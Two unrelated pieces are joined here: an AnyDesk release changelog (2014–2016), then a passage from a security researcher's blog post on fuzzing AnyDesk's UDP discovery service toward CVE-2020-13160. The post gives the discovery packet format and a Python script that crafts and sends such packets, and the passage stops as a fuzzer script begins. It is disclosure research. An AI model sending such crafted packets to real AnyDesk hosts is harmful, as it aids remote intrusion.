- The AnyDesk loader did not start in some cases when the user data directory was
on a network share.
- Fixed a clipboard file copy bug when the user connected to a freshly started
Windows machine onto the logon screen and then logged on user.
Other Changes
- Disabled remote restart feature after switching sides.
21.10.2016 - 2.6.1 (macOS)
--------------------------
New Features
- Implemented customisation support for my.anydesk.com for macOS
Fixed Bugs
- Enable/disable audio works now
- Receive connection window constraints were fixed
14.10.2016 - 2.6.0 (Windows)
----------------------------
New Features
- Implemented Access Control List feature. This makes it possible to restrict
access to machines based on the alias. Wildcards are supported, for example
"\*@company", "pc-?@ad" and so on. Restrictions based solely on the numerical
id are also supported. You can find the feature in the Security Panel of the
AnyDesk settings.
Fixed Bugs
- Fixed a bug where the file transfer and probably the text clipboard did not
work on Windows 7 when UAC was disabled and AnyDesk was not installed.
- Fixed a regression which could lead to being unable to control the remote machine
after activating a privileged window in the task bar when AnyDesk was not
installed.
- Fixed a bug which could cause severe image lag after using the "switch sides"
or "request elevation" features or doing a fast user switch of a remote
controlled Windows session.
Other Changes
- The remote users input is now temporarily disabled when typing on the local
keyboard. In previous versions, only moving the mouse disabled remote input.
14.10.2016 - 2.6.0 (macOS)
--------------------------
New Features
- Added a setting which prevents AnyDesk from auto-starting when the user logs
in. You can also set AnyDesk to start with a minimized window.
Fixed Bugs
- Improved the reliability of the clipboard.
- Fixed a bug in the interactive access settings which displayed the wrong
logon type.
14.10.2016 - 2.6.0 (All Versions)
---------------------------------
Fixed Bugs
- Improved reliability of the direct connection process.
- Improved clipboard stability.
21.09.2016 - 2.5.0 (Windows)
----------------------------
New Features
- Implemented remote restart feature.
The connection will automatically be restored once the remote machine finished
restarting.
- Added a confirmation dialog for the switch sides feature.
- The coloured user pointer can now be disabled in the security settings.
Fixed Bugs
- Fixed a bug which could lead to a wrong aspect ratio image or no image at all
when connecting to a multi monitor system until the first resize of the session
window.
- Fixed image corruption which could occur when the mirror driver was used.
- Fixed some inconsistencies in the remote capabilities for the request elevation
and the switch sides feature when connecting between different platforms.
- Improved stability.
Other Changes
- The uninstaller (anydesk --remove) now accepts the --silent flag.
21.09.2016 - 2.5.0 (macOS)
--------------------------
New Features
- Implemented audio playback on the mac.
- Implemented hard drive activity monitor.
Fixed Bugs
- Fixed the clipboard. It works now both for copying and pasting (text data).
Other Changes
- Improved the GUI.
21.09.2016 - 2.5.0 (Linux)
--------------------------
New Features
- Added pointing mode
Fixed Bugs
- Fixed cursor image corruption
- Fixed X11 deadlocking due to a bug in libxcb
- Fixed username retrieval
- Fixed a bug in the switch sides code
- Fixed a bug where wallpapers did not get transmitted
- Improved application startup
- Fixed bugs in the input injector
- Fixed possible deadlock
- Fixed image corruption which occured with certain versions of x11.
23.08.2016 - 2.3.7 (Linux)
--------------------------
Fixed Bugs
- Fixed a bug on headless machines in Linux
23.08.2016 - 2.3.6 (Linux)
--------------------------
New Features
- Implemented the input forbidden mouse cursor
Fixed Bugs
- Fixed a bug that caused a fuzzy mouse cursor
- Fixed a bug in the IPC
- Fixed a bug where a connection got rejected even if the frontend is opened
- Fixed a bug in the switch sides feature
18.08.2016 - 2.3.5 (Linux)
--------------------------
New Features
- Improved security by implementing the input blocker (remote user cannot control the backend, also local users mouse has priority over remote users mouse)
- Added proxy support
- Added the switch sides option
- Added bidirectional file transfer
- AnyDesk now has a proper CLI Interface
- Added update information box
Other Changes
- Improved password security check. Raised minimal password length to 8 characters.
- Changed default interactive access setting: the accept Window will now only pop up
if the AnyDesk window is currently open. Unattended access with a password is still
possible at any time.
Fixed Bugs
- Fixed a bug that could cause the backend to crash upon quitting
- Fixed a bug that could fuzz out the main window
04.08.2016 - 2.3.5 (Windows)
----------------------------
Fixed Bugs
- Fixed image capture when connecting to outdated Windows 7 versions.
- Fixed a bug in the license registration dialog.
Other Changes
- Long IDs are now displayed in groups of 3 digits.
22.07.2016 - 2.3.4 (Windows)
----------------------------
Fixed Bugs
- Fixed image problems with 16-bit/fast rendering method.
- Fixed a few more high DPI issues.
- Fixed protocol compatibility with the Enterprise server.
- Fixed a crash that could occur when the system info tab was opened a second time.
- The system info tab could be opened before authentication, which resulted in a crash.
20.07.2016 - 2.3.3 (Windows)
----------------------------
New Features
- Added a system information tab, that shows information about the remote computer.
- The path where screenshots are stored can now be changed.
- It is now possible to change the audio devices to use for playback and transmission.
Other Changes
- Improved password security check. Raised minimal password length to 8 characters.
- Changed default interactive access setting: the accept Window will now only pop up
if the AnyDesk window is currently open. Unattended access with a password is still
possible at any time.
Fixed Bugs
- Fixed some high DPI bugs (borders on maximized Window, ...).
- Fixed a bug where removing an entry from the speed dial could result in other
entries connecting to the wrong computer.
- After switching sides with a custom version that only allows incoming connections,
the display Window now becomes resizable.
05.07.2016 - 2.3.3 (macOS)
--------------------------
New Features
- Added proxy support.
Fixed Bugs
- Fixed a crash on some systems when the options window was opened.
- Fixed a bug which could delay the session start until the remote image changed once.
- If AnyDesk is started from the dmg file, it no longer registers as an startup app.
- Reworked the chat; added colours.
- The main window of AnyDesk now gets closed when the "X" button is pressed.
This also closes all sessions.
- Several minor bugfixes.
29.06.2016 - 2.3.2 (Mac OS X)
-----------------------------
This is the beta release of AnyDesk for Mac OS X.
New Features
- Implemented status bar icon. Please quit AnyDesk using the Dock or the status bar icon.
- AnyDesk now starts automatically when a user logs on.
- Reworked the connection dialogs.
- Fixed the request elevation menu entry.
- Completed the chat feature.
Fixed Bugs
- Fixed a bug in the keyboard translation.
- Fixed a bug in the detection of the network state. AnyDesk now reconnects when
the network connection is down and comes back up.
16.06.2016 - 2.3.1 (Mac OS X)
-----------------------------
Initial alpha release of AnyDesk for Mac OS X.
20.05.2016 - 2.3.1 (Linux/BSD)
------------------------------
New Features
- Added Audio support for Linux (PulseAudio only, libpulse is needed)
- Added structures for customized Linux Client (Enterprise only)
Fixed Bugs
- Fixed a bug causing a massive lag in the keyboard translation
- Several minor bugfixes
09.05.2016 - 2.3.0 (Linux/BSD)
------------------------------
New Features
- Implemented multi process architecture
- Implemented new event structure (performance)
- Added new keyboard layout (1:1 mapping, translation mode, automatic)
- Reworked GUI
- Reworked settings dialog
- Reworked accept window
- Added about dialog
- Reworked license registration
- Ability to place shortcuts to remote computers on the desktop
- Added support for transfering the wallpaper instead of a screenshot to speed dial
for some desktop environments (MATE, Gnome3, Unity, Cinnamon)
- Updated OpenSSL to newest version
Fixed Bugs
- Fixed package breaking Kubuntu Desktop (workaround for bug in qapt-deb-installer)
- Fixed deadlocks
- Fixed bug in chat
- Fixed bug in license registration
- Fixed bug that caused no direct connection
- Several minor bugfixes
29.04.2016 - 2.3.0 (Windows)
----------------------------
New Features
- Reworked the main menu into several menus.
Fixed Bugs
- Mouse jitter could cause AnyDesk to falsely display the user pointer and disallow
remote mouse input for some time. Small local mouse moves are now ignored.
- Fixed customer module displaying UAC dialog on Windows XP when it was not needed.
- Fixed termination of portable AnyDesk using the tray menu.
- The clipboard was not functioning correctly when AnyDesk was not installed but
started as Admin user.
- AnyDesk should now run on Windows PE.
- It is now possible to use the & sign in the user name.
- When AnyDesks looses the keyboard focus, the keys are now released at the remote
site in order to prevent stuck keys.
- Further improved GUI with high DPI settings.
- Improved the reliability of the direct connection mechanism.
23.03.2016 - 2.2.2
------------------
New Features
- Improved the request elevation feature. It is now possible to transmit credentials
for an admin user in case the remote user has limited user rights and does not now
the admin credentials.
Furthermore, the feature now supports switching the user (fast user switch) after
elevation has been successfull.
Fixed Bugs
- Fixed a bug in the automatic remote keyboard layout detection.
- Fixed a rare bug which could lead to AnyDesk being unable to reconnect after a while.
- Improved the clipboard mechanism. This should solve problems with the clipboard.
03.03.2016 - 2.2.1
------------------
Fixed Bugs
- Fixed a deadlock which could occur when the backend started. This could lead to
being unable to connect to a machine ("Waiting for connection") until the machine
was restarted.
- Fixed a bug where mouse input was falsely denied for certain areas of the screen.
25.02.2016 - 2.2.0
------------------
Fixed Bugs
- Fixed a crash which occured when the monitor was switched several times in Win 8/10.
- Fixed a bug which could cause AnyDesk to transmit inefficiently (low fps) when the
remote machine was running Windows 8.1 or Windows 10. This also could lead to
a slowdown of the target machine.
- The remote cursor was not rendered correctly when the Direct Draw render mode was
selected. The Direct Draw renderer now draws the remote cursor as intended.
- A black image was shown instead of the remote screen in certain cases when "Use fast
render method" was selected in the view options. The image is rendered normally now
if this mode is selected.
- If a 16 bpp mode is selected, the Direct Draw renderer now tests if a 32 bpp mode is
supported before falling back to the gdi renderer when the lower mode is not supported
by the hardware. The d3d renderer now supports 16 bpp colour depth as well and uses
the same fallback mechanism.
- In some cases, AnyDesk did not transmit any image (black image) when the screen was
rotated in Windows 7 with Aero enabled.
- The base64 password feature for anydesk: links did not work with all configurations.
Fixed.
- The forbidden cursor is displayed correctly again.
- The grey tray icon indicating that the AnyDesk service is not running is displayed
correctly again.
- Under certain conditions, connections to a machine failed with "desk\_rt\_ipc\_error".
This occured when AnyDesk was not installed. Added a workaround for these machines.
- AnyDesk now uses the monitor which is currently displaying the AnyDesk window when
going to fullscreen mode.
- AnyDesk is now scaled correctly with high dpi settings.
- AnyDesk now correctly terminates the session when it is stopped during fullscreen mode.
New Features
- AnyDesk now supports keyboard translation. If your keyboard layout is different from
the keyboard layout of the remote user, AnyDesk can translate the keys. This enables
you to type special characters on your keyboard regardless if the remote keyboard
supports them. You can disable this feature in the main menu in case you want raw key
to be transmitted. This is useful for example for playing games which depend on the
hardware key code.
- Select "Auto-Adjust resolution" from the main menu during a session in order to change
the remote screen resolution to fit the dimensions of your local AnyDesk window. You
can use this feature as often as needed, for example after you maximized the AnyDesk
window. After the session ends, the remote resolution is restored to the original mode.
- Added privacy tab to user settings. You can now decide what to broadcast, your windows
user name or a custom one, your windows account image, a custom one or none.
17.12.2015 - 2.1.2
------------------
Fixed Bugs
- Proxy connections did not succeed when there was no password for the proxy. Fixed.
- Fixed another bug which could cause the proxy connection to fail.
- Fixed a crash which occured when using the mouse wheel on certain dialogs.
- Fixed the original view mode when the open gl renderer was selected.
- Fixed a bug where the monitor could not be switched in fullscreen mode.
New Features
- After a change of access direction, the direction can now be switched back from the
accept window.
- anydesk: links now support passwords. To pass a password for a connection, use the
following scheme: "anydesk:address@ad:cGFzc3dvcmQ=". The password has to be in base64
encoding.
- new parameter --auto-close: This indicates to AnyDesk that it should auto-quit the
frontend window when there are no more sessions.
- new config option for customized AnyDesk: It is now possible to disable the different
tabs in the settings dialog using the client generator of the web console.
21.10.2015 - 2.1.1
------------------
Fixed Bugs
- Fixed a bug where it was not possible to move the mouse in remote desktop protocol sessions.
- The state of scroll lock, caps lock and num lock gets now restored when the last session
ends.
- Performance optimization for the d3d renderer in original view mode.
- Improved menu bar in fullscreen mode of the ddraw renderer (used in windows xp). The menu
bar disappeared in certain cases. It stays always on top now and is automatically hidden
after two seconds. Put the mouse cursor on the screen edge to display it again.
- AnyDesk would not start if there was a misconfiguration with the user app data folder.
Instead, an error message box was displayed. AnyDesk uses the local app data folder as
a fallback now.
- Terminating AnyDesk now requires admin privileges.
New Features
- Zoom text size in chat with mouse wheel and +/-
18.09.2015 - 2.1.0
------------------
Fixed Bugs
- The user picture is now correctly loaded in Windows 8 and 10.
- Improved behaviour of AnyDesk when Windows enters/leaves hybernate and suspend power modes.
New Features
- New feature "request elevation". This feature can be used to obtain the rights required to
control all programs while a session is running by asking the remote user.
21.08.2015 - 2.0.1
------------------
Fixed Bugs
- In some cases, unicode text was not correctly transmitted over the clipboard. This lead
to the text being put on the clipboard as "???????". AnyDesk now always sends unicode text,
if available.
- Under certain conditions, the clipboard synchronization stayed engaged if it was disabled
in the settings tab or the accept window.
- Fixed the remote mouse cursor position in original view mode.
New Features
- New performance option for rendering ("Use fast render method"). Set the checkbox as follows:
Checked: Always uses 16 bits per pixel for uploading (decreases required memory bandwidth).
Use this setting to speed up rendering on slow machines.
Indeterminate (default behaviour): Use the 16 bit render mode on single processor systems.
Unchecked: Never use 16 bits per pixel mode. Uncheck if you have a single processor machine
but the image quality is too low.
- Added translation to Korean.
- Added "Waiting for first frame" dialog which is displayed as soon as the network connection
is established.
- Added a new command line option --get-status to get the connection status and improved the
behaviour on errors of the command line interface.
- The tray icon now displays information about session count and service status.
01.07.2015 - 2.0.0
------------------
AnyDesk is now officially out of beta.
New Features
- Windows 10 compatibility
Fixed Bugs
- Fixed a crash at session start if the clipboard permissions were changed before session start.
- Fixed a crash at session start which could occur with some unicode user names when mouse input
was forbidden.
- The clipboard did not work when connecting to the Logon screen and logging in a new user.
- Sometimes the forbidden cursor was displayed during the whole session when connecting into
a Windows session which was created via RDP. This should not happen any more.
- Some settings from the security tab were not correctly applied. All default user permissions
from the security tab are now applied for sessions.
- If the alias is too long for display, a smaller font is used.
- Fixed a rare crash when the mouse cursor had an invalid pixel format.
- The "Show remote cursor" feature displayed the mouse cursor in an incorrect position for all
monitors except the first monitor. The cursor is displayed now correctly.
- Updated translations
AnyDesk Beta
============
01.06.2015 - Beta 1.4.1
-----------------------
Fixed Bugs
- Fixed a bug which lead to "Connection established" being displayed forever and no image being shown
when connecting to Windows 7 machines. This bug only occured when the pc was not restarted for
at least 24 days.
- Fixed a bug which could lead to a second zone security warning when AnyDesk was started as admin.
AnyDesk did not work in this case until the second zone dialog was accepted.
- When starting the portable version as admin and pressing "+", a cycle could be created which
lead to a crash.
22.05.2015 - Beta 1.4.0
-----------------------
New Features
- Implemented a feature for switching sides during an ongoing screen sharing session.
- When the remote session changes (for example with fast user switching), AnyDesk
automatically
restores the connection.
- When connecting using the command line, you can specify a password now using the stdin pipe.
Fixed Bugs
- Fixed a bug which could cause a client to appear online some time directly after shutting
down a workstation. Shutdown events now terminate the connection immediately.
- Overall stability improvements.
27.04.2015 - Beta 1.3.2
-----------------------
Fixed Bugs
- Fixed a bug with the user permissions which could lead to the user being unable to control the remote
machine or use sound/clipboard.
24.04.2015 - Beta 1.3.1
-----------------------
Fixed Bugs
- In rare cases, the mouse position was transmitted with an offset. The mouse position should now always
be correct.
- In certain cases, the text mouse cursor could appear invisible over black background. The mouse cursor
is rendered correctly now, with inverted colours.
- Controlling AnyDesk's accept window through AnyDesk is not possible anymore.
- Pressing the install button twice could lead to the installation process failing. Fixed.
New Features
- AnyDesk is now dpi aware.
- Implemented an arrow which is drawn at the remote users mouse position if input is disabled. If clicked,
a beacon is shown. This feature can be used to point the user to something without directly interacting
during remote support or presentations.
08.04.2015 - Beta 1.3.0
-----------------------
Fixed Bugs
- Improved the network code. This adds to the overall performance and fixes some random connection
freezes which occured in rare cases.
- Windows 8: When no mouse was attached to the machine being controlled, the mouse cursor was
missing. Provided a workaround which enables the mouse cursor during the AnyDesk session.
- Fixed a bug in the d3d renderer on multi monitor systems which caused the display to turn grey
when the AnyDesk window reached a certain size.
- If the user changed the permissions (e.g. audio allowed) before the session started, the
state was invalid which caused all permissions to be in the state disallowed.
Permissions can be changed before the session starts now.
- The forbidden cursor is now shown correctly if this feature is disabled using the permission
settings.
- Ongoing file transfers are canceled now when the session is terminated.
Improved efficiency of file transfer.
- Fixed a bug which caused copying files over the clipboard not to function correctly.
- Fixed a crash which could occur when terminating the frontend.
- Improved the switch to fullscreen mode for the d3d renderer.
New Features
- Implemented original view mode.
- Added a retry button in the client offline dialog.
- Added Open GL render mode from the linux port. Please check if this speeds up display or serves
as a workaround for d3d render bugs.
- The accept window is now minimized when the user accepts a connection request manually.
10.02.2015 - Beta 1.2.3
-----------------------
Fixed Bugs
- Fixed a bug that caused the mouse cursor to disappear.
- Fixed the SSL configuration so that fewer SSL ciphers are accepted.
26.01.2015 - Beta 1.2.2
-----------------------
New Features
- Added interactive access modes. AnyDesk can now be configured to accept no connection requests.
- Improved mouse behaviour when the cursor leaves the AnyDesk window while a mouse key is pressed.
- If the remote desktop becomes inaccessible due to insufficient rights, a message is displayed.
- Using the mirror driver can now be forced for non-server-systems which are too slow without mirror
driver.
- It is now possible to add firewall exceptions for AnyDesk by using the hostname "relay-\*.anydesk.com".
Fixed Bugs
- Fixed IPC error in the portable version when the path of the executable contains unicode characters.
- Fixed crash when double-clicking on a tab in the options dialog.
- The portable version now automatically is able to control system processes when started on systems
with UAC disabled.
- Improved process startup handling to prevent IPC errors.
- Connections to AnyDesk could result in desk\_rt\_ipc\_error when AnyDesk was started from a network drive.
- On some systems with unusual system path configuration AnyDesk did not start at all. Fixed.
- In some circumstances AnyDesk did not quit correctly while the renderer was busy.
- Fixed graphics glitches which occured when coming from a secure desktop with access denied.
- Sometimes, switching the monitor could cause graphics problems.
22.12.2014 - Beta 1.2.1
-----------------------
New Features
- Added an option to show the AnyDesk number instead of the Alias in the connection tab.
- New option to hide the own task bar when AnyDesk is maximized. This saves additional screen space.
- Registering a licence is now possible from the command line (e.g. from scripts).
- AnyDesk now sets its exit code. This is useful for diagnosing errors in scripts.
Fixed Bugs
- The installation and the update process should be more reliable now. In some cases, AnyDesk
could not be deinstalled or updated because a hanging process could not be terminated. This
would lead to not being able to connect to the machine any more after attempting to update.
- AnyDesk can now be installed if windows is running in safe mode.
- Fixed handling of service misconfigurations so the user gets a more helpful error message.
- Improved stability when clicking on the speed dial while a server connection is in progress.
- Fixed a painting glitch in the title bar.
18.12.2014 - Beta 1.2.0
-----------------------
New Features
- Chatting is now possible before authentication.
- Implemented a session tab menu.
- Implemented an url handler for AnyDesk (anydesk:machine@ad).
- The items in the speed dial can be renamed now.
- Improved the password strength calculation.
- Added license registration dialog.
- Implemented mirror driver support for Windows XP and Windows Server.
Fixed Bugs
- Filetransfer does not block the image data any more (AnyDesk remains usable while a file is copied).
- Connecting to a workstation which is being shut down now works also on Windows XP.
- Improved stability when closing sessions and during fullscreen transition.
- Under certain conditions the mouse cursor was hidden after session start. Fixed.
- Fixed a bug which caused the icon of AnyDesk not to diplay correctly.
- Some rare conditions could lead to AnyDesk not being able to establish a connection to another user.
A workaround has been implemented.
26.11.2014 - Beta 1.1.7
-----------------------
New Features
- Settings can now be removed completely during uninstallation
- All incoming connections are now logged with date and time and can be viewed in the about tab.
- Implemented Windows Jump List support
- Clear menu for speed dial
- Implemented Hotkeys: Press ctrl+alt+shift+
1..9: tab selection.
return: toggle fullscreen
c: open chat menu
S: toggle sound transmission
I: toggle input state
P: save screenshot
M: show mouse cursor
F3: view mode shrink
F4: view mode stretch
del: Send SAS sequence (press ctrl+alt+del on controlled machine)
- Double click on monitor tab goes to full screen mode
Fixed Bugs
- Fixed missing fullscreen menu for Windows XP and ddraw render mode.
- Improved stability
- Standby is disabled now properly during sessions
- The own AnyDesk id can now be copied from the id label through an AnyDesk session
- On slow/laggy connections, the mouse key events could get intermingled. This would cause unintended
mouse dragging and hanging mouse keys.
- Fixed Ctrl+Alt+Del (SAS) sequence in Windows Vista and Windows Server 2008
- Better handling of misconfigurations of the service.
- AnyDesk now runs in safe mode with network if started manually.
- Connecting to a workstation which was being shut down resulted in desk\_rt\_ipc\_error.
Connecting is possible now. The shutdown is canceled.
17.10.2014 - Beta 1.1.6
-----------------------
New Features
- Implemented NAT traversal with UPnP.
- Improved the command line interface.
The password can be set now using the command line and the AnyDesk alias and ID can be obtained.
The installation process can now be started in the background from the command line.
Fixed Bugs
- Improved the connection mechanism.
- Under certain conditions, unconventional graphic drivers could lead to AnyDesk not transmitting any image at all.
In these cases, a slower but more reliable fallback mechanism for capturing the image is used.
07.10.2014 - Beta 1.1.5
-----------------------
New Features
- The port that is used for external connections can now be configured.
Fixed Bugs
- The reconnect mechanism now retries the bootstrap servers, when the current server is down.
- AnyDesk now tries its dedicated listen port when connecting externally.
- AnyDesk now works correctly when running as the Guest user.
- Fixed a crash that occurred when trying to connect too soon after startup.
- Fixed a problem with file copy & paste on Windows XP.
03.09.2014 - Beta 1.1.4
-----------------------
New Features
- Updated translations
- Added Estonian translation. Many thanks to Lauri S\E4de!
Fixed Bugs
- Fixed a crash which mostly occured when AnyDesk was teminated and restarted while a session was open.
All newly started AnyDesk instances would crash then.
- Corrected language name of Chinese.
- Fixed a bug which caused the control process to crash at startup. File transfer did not work in this case.
- Fixed a crash of the frontend in ddraw mode (Windows XP) which occured when the screen saver engaged.
15.08.2014 - Beta 1.1.3
-----------------------
New Features
- Extended mouse buttons and horizontal wheel states are transmitted now.
Fixed Bugs
- When AnyDesk lost the network connection, it could happen in some conditions that it could not reconnect to the
server and remained offline until the machine was restarted.
- The file transfer now updates file date and time correctly.
- Implemented correct behaviour with swapped mouse buttons (left handed mouse).
- Fixed a bug which caused an missplaced uac dialog at system start if the service start was delayed.
This state is now signaled by a grey systray icon instead of the red one. As soon as the service is started,
the tray icon is updated.
05.08.2014 - Beta 1.1.2
-----------------------
New Features
- When a user logged in using a password, the accept window is minimized automatically.
Fixed Bugs
- Fixed chat log.
- Fixed a crash in the frontend on Windows XP.
- Fixed a bug which caused AnyDesk to crash immediately after startup when it was started from a folder with
special characters.
29.07.2014 - Beta 1.1.1
-----------------------
Fixed Bugs
- Fixed a crash when switching to fullscreen mode (when the remote system has multiple monitors).
25.07.2014 - Beta 1.1.0
-----------------------
New Features
- Experimental HTTPS proxy support (please contact us if you encounter any problems)
- Support for proxy authentication (Basic + Digest, NTLM is not supported yet)
- Support for the Web Proxy Autodiscovery protocol (WPAD)
- Text chat.
- Drop any saved connection from the speed dial to a quick link on your desktop folder.
- Connect via command line. Usage: "anydesk.exe alias@ad"
- A warning is shown if AnyDesk has insufficient rights (because it is not installed or
running as normal user) to control privileged applications
Fixed Bugs
- New AnyDesk network connect mechanism (this should fix some reconnect issues)
- Sometimes the mouse cursor was missing at session start.
- When AnyDesk was not running with system privileges, a user could activate a privileged window using the
task bar. This caused a lock-in, and no further actions were possible.
- Fixed crash which could occur during the fullscreen switch
- Fixed a crash which could occur when the move/size-helper was enabled
- AnyDesk now runs better on windows xp when the user is restricted.
- The tray icon is re-created when the explorer restarts
- Fixed a bug at the startup of the control process. This could lead to copy paste (text and files) malfunctioning.
- Connecting to Windows XP machines could result in desk\_rt\_ipc\_error. This should not happen anymore.
- A problem in Windows XP with GDI+ which could lead to a crash directly after connecting. Provided workaround.
- If there is not enough system ram available, a message is shown instead of crashing.
- Fixed a crash which could occur sometimes at session termination (message callback was not cleaned up).
18.06.2014 - Beta 1.0.3
-----------------------
New Features
- Authentication data can now be stored on connect. This won't store the password, but will
request a security token from the destination computer that will be used on the next login.
The feature can be disabled in the options tab. All tokens can be cleared there as well.
- The fingerprint of the remote side certificate can now be examined by looking at the lock
icons tooltip in the status bar.
Fixed Bugs
- Fixed a rare crash in the service process.
- Fixed a problem with the translation fallback for Spanish, Italian and Bulgarian. Some
strings were emtpy.
Known Issues
- AnyDesk must be installed to work on Windows Server, which isn't officially supported yet.
05.06.2014 - Beta 1.0.2
-----------------------
New Features
- Mouse and keyboard input can now blocked from the frontend for the machine being controlled.
Fixed Bugs
- When there was a new version, the download immediately started in the browser, when the
frontend was started. Now, AnyDesk waits for the user to click, as expected.
- Fixed a problem when terminating the backend process.
Known Issues
- AnyDesk must be installed to work on Windows Server, which isn't officially supported yet.
03.06.2014 - Beta 1.0.1
-----------------------
Fixed Bugs
- Switching to fullscreen mode could lead to a crash when the remote mouse cursor was displayed.
- Multiple sessions could interfere with each other and crash the backend process.
- Sometimes the backend process crashed when terminating a session.
- The frontend process could crash in some circumstances on establishing a connection.
21.05.2014 - Beta 1.0.0
-----------------------
Initial release.


=== Content from devel0pment.de_62848768_20250119_142558.html ===

[Skip to content](#content)
![](https://devel0pment.de/wp-content/uploads/2018/03/cropped-dev_05.png)

[devel0pment.de](https://devel0pment.de/)

software, offensive security research

Posted on [9. June 202015. June 2020](https://devel0pment.de/?p=1881) by [scryh](https://devel0pment.de/?author=1)
# AnyDesk UDP Discovery Remote Code Execution (CVE-2020-13160)

![](https://devel0pment.de/wp-content/uploads/2020/06/cve.png)

One of my goals for this year is to spend a little bit more of my spare time on real world applications. Doing so I took a look at the remote desktop application [AnyDesk](https://anydesk.com/), which seems to quickly raise in popularity not only because of COVID-19. AnyDesk is available for a variety of operating systems including Windows, Linux, Android and iOS. By reversing and fuzzing the Linux version 5.5.2 of the application I was able to find a format string vulnerability, which can be used to gain Remote Code Execution (RCE) by sending a single UDP packet to the target machine. AnyDesk took the issue very seriously. They released a patch only three days after my notification (5.5.3) and paid me a bounty of 5.000 EUR. The vulnerability is tracked as [CVE-2020-13160](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-13160). Within this article I want to share all steps, which were involved in finding the vulnerability, understanding the bug and developing the RCE exploit. The article is divided into the following sections:

→ [Fuzzing](https://devel0pment.de/?p=1881#fuzzing)

→ [Bug](https://devel0pment.de/?p=1881#bug)

→ [Exploit](https://devel0pment.de/?p=1881#exploit)

    – [Strategy](https://devel0pment.de/?p=1881#strategy)

    – [The v in vsnprintf](https://devel0pment.de/?p=1881#vsnprintf)

    – [Gaining arbitrary write](https://devel0pment.de/?p=1881#write)

    – [Controlling the instruction pointer](https://devel0pment.de/?p=1881#ip)

    – [Hitting our shellcode: dynamic field width](https://devel0pment.de/?p=1881#shellcode)

    – [Final exploit](https://devel0pment.de/?p=1881#final)

→ [Conclusion](https://devel0pment.de/?p=1881#conclusion)

---

# Fuzzing

The AnyDesk application is running multiple processes with different permissions. The most valuable target is the service process `/usr/bin/anydesk --service`, since this process is running with `root` privileges. There are two older CVEs ([CVE-2017-14397](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-14397) and [CVE-2018-13102](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-13102)), which target this process on Windows in order to escalate privileges. Both of these exploits are DLL injection/preloading vulnerabilities, which only work locally. My desire was to find a vulnerability, which can be exploited remotely.

At first we need to figure out which remote communication with the AnyDesk application is possible. This can simply be done by starting the application and using `netstat` to determine on which ports the application is listening:

```

user@w00d:~$ sudo netstat -tulpn | grep anydesk
tcp        0      0 0.0.0.0:7070            0.0.0.0:*               LISTEN      598/anydesk
udp        0      0 0.0.0.0:50001           0.0.0.0:*                           598/anydesk

```

Accordingly the application is listening on TCP port `7070` and UDP port `50001`. By displaying all anydesk processes, we can see that the listening process is the service process itself (PID `598`). Also recognize the traybar process (PID `2983`) as well as the front-end process (PID `3421`):

```

user@w00d:~$ sudo ps aux | grep anydesk
root       598  0.0  0.3 531172 28620 ?        Ssl  08:56   0:02 /usr/bin/anydesk --service
user      2983  0.0  0.2 744288 23736 tty2     Sl+  08:58   0:00 /usr/bin/anydesk --tray
user      3421  0.0  0.4 864624 37760 tty2     Sl+  09:01   0:00 /usr/bin/anydesk

```

Before we can reasonably fuzz the application, we have to determine what data the application is usually expecting to receive on these ports. In order to get some sample data, we can inspect all traffic related to these ports using `wireshark` while interacting with the application.

According to the observations we can make with wireshark TCP port 7070 is used for the actual remote desktop connection and uses TLS to encrypt the traffic. The details are not relevant for our considerations here. The relevant port is UDP 50001, which is used to announce AnyDesk clients within a local network. On startup of AnyDesk we can see that our client sends UDP packets to `239.255.102.18` in order to announce its presence. The packet contains the hostname (`w00d`), the username (`scryh`), a profile picture as well as a few other information:

![](https://devel0pment.de/wp-content/uploads/2020/05/anyd_01.png)

Assuming that these announcements are also processed by our own client, we now have some legitimate data in order to fuzz the application. At first I started by fuzzing the application using [fuzzotron](https://github.com/denandz/fuzzotron), which is written in C and is quite fast. fuzzotron uses [radamsa](https://gitlab.com/akihe/radamsa) and/or [blab](https://github.com/aoh/blab) for the mutation of the input data. The setup is straightforward. We simply put our initial data observed in wireshark in a test-case file and then run fuzzotron providing among others the IP address and port as well as the PID, which fuzzotron should monitor for possible crashes.

Unfortunately I could not find any flaws that seemed to be exploitable. So I decided to change the approach. Instead of directly targeting the service process, which is listening on the network socket, we can focus on the front-end process (PID `2983` in the output above). The front-end process is responsible for displaying the GUI to the user and communicates with the service process to exchange information relevant for the GUI. When the service process receives a valid UDP announcement frame this frame is passed to the front-end process in order to display the announced device within the GUI:

![](https://devel0pment.de/wp-content/uploads/2020/05/anyd_02.png)

To make our fuzzing input reach the front-end process we have to send valid announcement frames. The problem here is that most of the frames produced by the fuzzer we used so far are not valid, because there are mutated without any knowledge of the specific format of these frames. Accordingly most of the fuzzer-mutated frames are dropped by the service process and never reach the front-end process.

In order to create valid announcement frames we have to understand how the frames are built. Fortunately the format is not very complicated. By changing settings like our username or hostname and then observing the corresponding announcement frames our client is sending, we can derive how the frames are built. Among other things a frame contains the AnyDesk ID (4-byte), an operating system ID (1-byte) as well as the hostname and username, which are both transmitted as a 4-byte length field (`big-endian`) followed by the actual data. There are a few other fields and static values, which are not relevant for our considerations. The following python script creates a valid frame based on the given parameters and sends it to our local machine on UDP port 50001:

```

#!/usr/bin/env python

import struct
import socket

ip = '127.0.0.1'
port = 50001

def gen_discover_packet(ad_id, os, hn, user, inf, func):
  d  = chr(0x3e)+chr(0xd1)+chr(0x1)
  d += struct.pack('>I', ad_id)
  d += struct.pack('>I', 0)
  d += chr(0x2)+chr(os)
  d += struct.pack('>I', len(hn)) + hn
  d += struct.pack('>I', len(user)) + user
  d += struct.pack('>I', 0)
  d += struct.pack('>I', len(inf)) + inf
  d += chr(0)
  d += struct.pack('>I', len(func)) + func
  d += chr(0x2)+chr(0xc3)+chr(0x51)
  return d

p = gen_discover_packet(4919, 1, 'custom host', 'custom username', 'ad', 'main')
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.sendto(p, (ip, port))
s.close()

```

After running the script we can see in the GUI that the front-end received the announcement and the fake device is displayed:

![](https://devel0pment.de/wp-content/uploads/2020/05/anyd_03.png)

Now we are ready to explicitly fuzz certain fields of the frame. In order to do this we extend the python script to serve as our fuzzer. We can generate the actual fuzzing input by using radamsa again. Also we will monitor the front-end process and dump the last 10 fuzzing inputs, if the process died. The full fuzzer script, which targets the hostname, looks like this:

```

#!/usr/bin/env python

import struct
import socket
import subprocess
import psutil
